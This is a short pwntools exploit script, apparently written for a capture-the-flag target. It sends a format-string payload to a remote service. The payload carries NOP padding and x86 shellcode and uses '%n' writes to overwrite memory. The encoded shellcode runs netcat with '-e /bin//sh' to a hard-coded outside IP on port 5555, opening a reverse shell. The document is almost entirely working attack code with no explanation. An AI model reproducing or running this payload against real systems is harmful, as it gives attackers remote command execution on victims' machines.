from pwn import *

#X = 53500 - 8 - nops - shellcode
#Y = 65535 - X - 8 - nops - shellcode

i = 0

while i < 1:
    r = remote("XXXXXXXX", 00001)
    p = "\x00\x00\x00\x00"
    p += "\x00\x00\x00\x00"
    p += "\x90"*400 #34
    p += "\x31\xd2\x52\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x2e\x32\x31\x32\x68\x2e\x31\x35\x32\x68\x2e\x31\x38\x30\x66\x68\x33\x35\x89\xe0\x52\x68\x35\x35\x35\x35\x89\xe1\x52\x66\x68\x2d\x65\x89\xe7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe6\x52\x56\x57\x51\x50\x53\x89\xe1\x6a\x0b\x58\xcd\x80"
    # 78
   # x = 0xf778 + i - 8 - 400 - 78
    x = 63036
    y = 0x1bfff - x - 8 - 400 - 78
    p += "%"
    p += str(x)
    print(x)
    p +="x%5$n"
    p += "%"
    p += str(y)
    p += "x%6$n"
    print(y)
    p += "\n"
    r.send(p)
    r.close()
    i += 1
    sleep(0.2)
